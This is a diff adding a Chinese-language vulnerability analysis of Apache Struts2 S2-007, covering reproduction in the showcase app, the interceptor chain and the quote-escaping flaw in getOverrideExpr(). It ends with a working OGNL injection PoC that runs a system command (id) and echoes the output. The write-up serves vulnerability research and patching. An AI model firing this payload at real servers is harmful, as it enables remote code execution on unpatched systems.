@@ -338,17 +338,104 @@ https://cwiki.apache.org/confluence/display/WW/S2-005
 
 <img src="pic/struts2_s2-005_9.png">
 
-
 <a name="s2-007"></a>
 ## S2-007
 
+官方漏洞公告：<br>
+https://cwiki.apache.org/confluence/display/WW/S2-007
+
+影响版本：`Struts 2.0.0 - Struts 2.2.3`
+
 ## 漏洞复现与分析
 
+从漏洞公告可获悉该漏洞出现的场景和PoC。
 
+这里使用Struts2 `2.2.3`自带的示例应用`showcase`进行漏洞复现，找到校验器Validate部分，如下：
+
+<img src="pic/struts2_s2-007_1.png">
+
+如上图，在`Integer Validator Field`一栏的输入框中，输入PoC `<' + #application + '>`，提交后，由于没有通过应用程序中定义的整数校验器的校验，所以将输入中包含的OGNL表达式进行解析，并将解析结果进行返回。
+
+<img src="pic/struts2_s2-007_2.png">
+
+从漏洞公告中可获悉漏洞出现在struts2的默认拦截器`com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor`的`getOverrideExpr()`方法中：
+
+<img src="pic/struts2_s2-007_3.png">
+
+如上图，该方法返回`"'" + value + "'"`。结合给出的PoC，很容易可猜想到，该方法会将文本输入框中提交过来的字符串用单引号`'`包裹上，原因应该是为了防止OGNL表达式的执行。很明显，可构造输入将这里的单引号`'`左右都进行闭合，便可以绕过防护。
+
+>在调试分析该漏洞前，建议先了解下struts2的主体架构和运行主线，关于这个可参考陆舟编著的《Struts2技术内幕》第七、第八章。
+>
+>另外，还需要了解一下struts2的校验器框架的原理。关于这个可参考链接：https://blog.csdn.net/Mark_LQ/article/details/49837507
+
+下面来实际调试分析一下。
+
+struts2提供的校验器框架，也是通过拦截器去实现的。按照拦截器的先后顺序，下面会提及最后的四个：
+
+<img src="pic/struts2_s2-007_4.png">
+
+1. `params`对应的类：`com.opensymphony.xwork2.interceptor.ParametersInterceptor`
+2. `conversionError`对应的类：`org.apache.struts2.interceptor.StrutsConversionErrorInterceptor`
+3. `validation`对应的类：`org.apache.struts2.interceptor.validation.AnnotationValidationInterceptor`
+4. `workflow`对应的类：`com.opensymphony.xwork2.interceptor.DefaultWorkflowInterceptor`
+
+表单提交后，会先到拦截器`ParametersInterceptor#doIntercept()`进行处理，会把参数存到当前值栈ValueStack的上下文对象context中，然后再把执行的控制权移交下一个拦截器`StrutsConversionErrorInterceptor`去执行。
+
+<img src="pic/struts2_s2-007_5.png">
+
+`StrutsConversionErrorInterceptor`从`ActionContext`中将转化类型时发生的错误信息添加到校验器对应的Action对象的FieldError中，在校验时候经常被使用到来在页面中显示类型转化错误的信息。
+
+<img src="pic/struts2_s2-007_8.png">
+
+另外，还会将类型转化失败的参数值传入`getOverrideExpr()`方法进行处理，处理后再通过回调的方式保存到当前值栈ValueStack对象的属性`overrides`中，该属性是一个`Map`集合。
+
+<img src="pic/struts2_s2-007_6.png">
+
+<img src="pic/struts2_s2-007_7.png">
+
+问题就出现在这个`getOverrideExpr()`，这里只是简单的用单引号`'`包裹文本框输入。所以输入的时候添加单引号`'`将这里的单引号闭合即可让OGNL表达式跳出单引号的包裹。
+
+拦截器`StrutsConversionErrorInterceptor`处理完后就将执行的控制权移交给下一个拦截器`AnnotationValidationInterceptor`。
+
+`AnnotationValidationInterceptor`的职责就是获取应用程序定义的校验器(validator)，并使用这些校验器对用户输入进行校验，结果是校验失败。校验结束后，将执行的控制权移交给最后一个拦截器`DefaultWorkflowInterceptor`。
+
+由于在`AnnotationValidationInterceptor`中使用校验器校验用户输入的结果是校验失败，所以在`DefaultWorkflowInterceptor`中就根据该结果，返回字符串`"input"`，产生的结果就是返回`input`视图页面，从而中止了整个执行栈的调度执行。
+
+接着就是构造`input`的视图页面，它是JSP页面，所以后面的漏洞触发流程也就跟`S2-001`差不多了，调用栈如下：
+```
+TextFieldTag#doEndTag()
+  ComponentTagSupport#doEndTag()
+    UIBean#end()
+      UIBean#evaluateParams()
+        Component#findValue()
+          TextParseUtil#translateVariables()
+            OgnlValueStack#findValue()
+              OgnlValueStack#tryFindValueWhenExpressionIsNotNull()
+                OgnlValueStack#tryFindValue()
+                  OgnlValueStack#lookupForOverrides()
+                  OgnlValueStack#getValue()
+```
+
+其中，在`OgnlValueStack#lookupForOverrides()`方法中会取出当前值栈的`overrides`属性，该属性中存放了前面类型转化失败的入参，也就是文本框中输入的内容。取出来后进行OGNL表达式计算。
+
+至此，该漏洞的原理分析完了。
 
 ### 可回显PoC
 
-
+```
+' + (
+#_memberAccess.allowStaticMethodAccess=true,
+#context['xwork.MethodAccessor.denyMethodExecution']=false,
+#ret=@java.lang.Runtime@getRuntime().exec('id'),
+#br=new java.io.BufferedReader(new java.io.InputStreamReader(#ret.getInputStream())),
+#res=new char[20000],
+#br.read(#res),
+#writer=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
+#writer.println(new java.lang.String(#res)),
+#writer.flush(),
+#writer.close()
+) + '
+```
 
 ## 漏洞修复
 
